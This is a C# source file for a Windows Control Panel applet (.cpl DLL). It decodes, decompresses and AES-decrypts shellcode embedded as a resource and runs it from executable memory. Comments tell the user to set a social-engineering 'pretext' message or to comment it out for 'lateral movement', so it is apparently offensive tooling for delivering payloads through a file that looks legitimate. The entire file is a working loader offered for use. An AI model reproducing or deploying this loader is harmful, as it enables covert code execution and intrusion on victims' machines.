using System;
using System.Runtime.InteropServices;
using RGiesecke.DllExport;
using System.Reflection;
using System.IO;
using System.Text;
using System.IO.MemoryMappedFiles;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO.Compression;

public class Test
{
    public const int KEY_SIZE = 16;
    public const string KEY = "changeme";

    private static string ExtractResource(string filename)
    {
        var assembly = Assembly.GetExecutingAssembly();
        var resourceName = filename;

        using (Stream stream = assembly.GetManifestResourceStream(resourceName))
        using (StreamReader reader = new StreamReader(stream))
        {
            string result = reader.ReadToEnd();
            return result;
        }

    }
    private delegate IntPtr GetPebDelegate();


    public static byte[] Decompress(byte[] input)
    {
        using (var source = new MemoryStream(input))
        {
            byte[] lengthBytes = new byte[4];
            source.Read(lengthBytes, 0, 4);

            var length = BitConverter.ToInt32(lengthBytes, 0);
            using (var decompressionStream = new GZipStream(source,
                CompressionMode.Decompress))
            {
                var result = new byte[length];
                decompressionStream.Read(result, 0, length);
                return result;
            }
        }
    }

    static byte[] Decrypt(string password, byte[] encryptedBytes)
    {

        var sha256CryptoServiceProvider = new SHA256CryptoServiceProvider();
        var hash = sha256CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(password));
        var key = new byte[KEY_SIZE];
        var iv = new byte[KEY_SIZE];

        Buffer.BlockCopy(hash, 0, key, 0, KEY_SIZE);
        Buffer.BlockCopy(hash, KEY_SIZE, iv, 0, KEY_SIZE);

        using (var cipher = new AesCryptoServiceProvider().CreateDecryptor(key, iv))
        using (var source = new MemoryStream(encryptedBytes))
        using (var output = new MemoryStream())
        {
            using (var cryptoStream = new CryptoStream(source, cipher, CryptoStreamMode.Read))
            {
                cryptoStream.CopyTo(output);
            }
            return output.ToArray();
        }
    }

    [DllExport("CPlApplet", CallingConvention = CallingConvention.StdCall)]
    public unsafe static IntPtr CPlApplet()
    {
        // Change this for your pretext or comment out for lateral movement
        //MessageBox.Show("Windows Trust Provider UI Succeeded", "Success");

        string scode = ExtractResource("ControlPanelMaker.Resources.txt");
        byte[] blob = Convert.FromBase64String(scode);
        byte[] sc = Decompress(blob);
        byte[] shellcode = Decrypt(KEY, sc);

        if (shellcode.Length == 0) return IntPtr.Zero;
        MemoryMappedFile mmf = null;
        MemoryMappedViewAccessor mmva = null;

        try
        {
            // Create a read/write/executable memory mapped file to hold our shellcode..
            mmf = MemoryMappedFile.CreateNew("__sc", shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

            // Create a memory mapped view accessor with read/write/execute permissions..
            mmva = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

            // Write the shellcode to the MMF..
            mmva.WriteArray(0, shellcode, 0, shellcode.Length);

            // Obtain a pointer to our MMF..
            var pointer = (byte*)0;
            mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);

            // Create a function delegate to the shellcode in our MMF..
            var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), typeof(GetPebDelegate));

            // Invoke the shellcode..
            return func();
        }
        catch
        {
            return IntPtr.Zero;
        }
        finally
        {
            mmva?.Dispose();
            mmf?.Dispose();
        }

    }
}
